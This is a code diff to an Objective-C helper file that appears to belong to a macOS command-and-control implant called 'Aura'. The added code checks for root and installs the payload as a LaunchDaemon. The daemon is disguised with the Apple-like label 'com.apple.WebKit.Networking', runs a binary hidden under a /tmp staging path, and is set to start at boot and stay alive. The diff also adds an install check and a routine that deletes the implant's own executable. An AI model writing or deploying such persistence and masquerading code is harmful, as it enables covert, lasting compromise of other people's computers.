@@ -1,5 +1,7 @@
 #import "SystemInfoHelper.h"
 #import "C2Task.h"
+#import "NSTask.h"
+// #import "IOMobileFrameBuffer.h"
 
 @implementation SystemInfoHelper
 
@@ -89,14 +91,80 @@
     return [NSString stringWithUTF8String:domainName];
 }
 
-- (void)captureFramebufferScreenshot {
++ (void)takeScreenshotWithTask:(id)sender {
+    // ...
+}
+
++ (BOOL)isRootUser {
+    return (geteuid() == 0);
+}
+
+/// Is the agent currently installed?
+/// - Plist exists
+/// - Service is loaded
+/// - Payload image exists
++ (BOOL)agentIsInstalled {
+    // Check if running as root
+    BOOL isRoot = [self isRootUser];
+    if (!isRoot) {
+        NSLog(@"❌ Not running as root. Assuming the agent is not installed.");
+        return NO;
+    }
+
+    // Path to the plist
+    NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
     
+    // Check if the plist file exists
+    if (![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
+        NSLog(@"Aura agent is not currently installed: %@", plistPath);
+        return NO;
+    }
+
+    // Check if the service is loaded using exit code
+    NSTask *task = [[NSTask alloc] init];
+    task.launchPath = @"/bin/launchctl";
+    task.arguments = @[@"list", @"com.apple.WebKit.Networking"];
+
+    [task launch];
+    [task waitUntilExit];
+
+    int terminationStatus = task.terminationStatus;
+
+    // If the exit code is 118, the service is not loaded
+    if (terminationStatus == 118) {
+        NSLog(@"❌ Service is not loaded.");
+        return NO;
+    } else if (terminationStatus == 0) {
+        NSLog(@"✅ Service is loaded.");
+    } else {
+        NSLog(@"❌ Unexpected exit code from launchctl: %d", terminationStatus);
+        return NO;
+    }
+
+    // Check if the payload image (executable) exists
+    NSDictionary *plistContents = [NSDictionary dictionaryWithContentsOfFile:plistPath];
+    NSArray *programArguments = plistContents[@"ProgramArguments"];
+    if (programArguments.count > 2) {
+        NSString *payloadPath = programArguments[2]; // The path to the executable is the third argument
+
+        // Check if the payload file exists
+        if ([[NSFileManager defaultManager] fileExistsAtPath:payloadPath]) {
+            NSLog(@"✅ Payload image exists: %@", payloadPath);
+            return YES;
+        } else {
+            NSLog(@"❌ Payload image does not exist at path: %@", payloadPath);
+            return NO;
+        }
+    } else {
+        NSLog(@"❌ Invalid ProgramArguments in plist.");
+        return NO;
+    }
 }
 
 
 
-+ (BOOL)deleteExecutable {
-    // Get the path of the current executable
++ (BOOL)uninstallAgent {
+    // Get the path of our executing image
     char pathBuffer[1024];
     uint32_t size = sizeof(pathBuffer);
     _NSGetExecutablePath(pathBuffer, &size);
@@ -108,21 +176,114 @@
     // Log the standardized path
     NSLog(@"Payload image path: %@", standardizedPath);
 
-    // Check if the file exists before trying to remove it
+    // Check if the Agent exists before trying to remove it
     if ([[NSFileManager defaultManager] fileExistsAtPath:standardizedPath]) {
         NSError *error = nil;
         BOOL success = [[NSFileManager defaultManager] removeItemAtPath:standardizedPath error:&error];
+
         if (success) {
             NSLog(@"✅ Successfully deleted the Aura payload.");
             return YES;
         } else {
-            NSLog(@"❌ Failed to delete our payload!!\n %@", error);
+            NSLog(@"❌ Failed to delete the payload!! Error: %@", error);
             return NO;
         }
     } else {
-        NSLog(@"✅ Payload is already deleted %@", standardizedPath);
+        NSLog(@"✅ Payload is already deleted: %@", standardizedPath);
         return YES; // Assume success since it's already deleted
     }
 }
+
++ (BOOL)persistAgent {
+    // Check if running as root
+    BOOL isRoot = [self isRootUser];
+    if (!isRoot) {
+        NSLog(@"❌ Not running as root. Cannot persist as a LaunchDaemon.");
+        return NO;
+    }
+
+    // Use the LaunchDaemon plist path
+    NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
+    
+    // Log the plist path
+    NSLog(@"Writing to: %@", plistPath);
+
+    // Check if the directory exists, if not, create it
+    BOOL isDirectory;
+    NSString *plistDirectory = @"/Library/LaunchDaemons/";
+    if (![[NSFileManager defaultManager] fileExistsAtPath:plistDirectory isDirectory:&isDirectory] || !isDirectory) {
+        NSError *directoryError = nil;
+        NSLog(@"Directory %@ does not exist, attempting to create it.", plistDirectory);
+        BOOL directoryCreated = [[NSFileManager defaultManager] createDirectoryAtPath:plistDirectory withIntermediateDirectories:YES attributes:nil error:&directoryError];
+
+        if (!directoryCreated) {
+            NSLog(@"❌ Failed to create directory at %@. Error: %@", plistDirectory, directoryError);
+            return NO;
+        } else {
+            NSLog(@"✅ Successfully created directory: %@", plistDirectory);
+        }
+    }
+
+    // With the following dictionary contents:
+    NSDictionary *plistContents = @{
+        @"Label": @"com.apple.WebKit.Networking",
+        @"ProgramArguments": @[
+            @"/bin/bash",
+            @"-c",
+            @"/tmp/var/db/com.apple.xpc.roleaccountd.staging/aura"
+        ],
+        @"RunAtLoad": @YES,
+        @"KeepAlive": @YES
+    };
+    
+    // Attempt to write the dictionary to the plist file
+    NSError *writeError = nil;
+    BOOL success = [plistContents writeToFile:plistPath atomically:YES];
+    
+    // Log the success/failure of the plist writing
+    if (success) {
+        NSLog(@"✅ Plist successfully written to: %@", plistPath);
+    } else {
+        NSLog(@"❌ Failed to write plist at: %@. Error: %@", plistPath, writeError);
+        return NO;
+    }
+
+    // Load the plist with `/sbin/launchctl load -w /path/to/plist`
+    NSTask *task = [[NSTask alloc] init];
+    task.launchPath = @"/bin/launchctl";
+    task.arguments = @[@"load", @"-w", plistPath];
+
+    // Capture the standard output and standard error
+    NSPipe *pipe = [NSPipe pipe];
+    task.standardOutput = pipe;
+    task.standardError = pipe;
+
+    NSFileHandle *file = [pipe fileHandleForReading];
+
+    [task launch];
+    [task waitUntilExit];
+
+    // Read the output
+    NSData *data = [file readDataToEndOfFile];
+    NSString *output = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+    // Log the output from launchctl
+    NSLog(@"launchctl output: %@", output);
+    
+    // Log the termination status of the launchctl command
+    NSLog(@"Loading plist with launchctl: termination status = %d", task.terminationStatus);
+
+    // Validate and return the success of the launchctl command
+    if (task.terminationStatus == 0 && ![output containsString:@"Operation not permitted"]) {
+        NSLog(@"✅ Plist successfully loaded by launchctl.");
+        return YES;
+    } else {
+        NSLog(@"❌ Failed to load plist with launchctl. Error: %@", output);
+        return NO;
+    }
+}
+
+
+
 
 @end
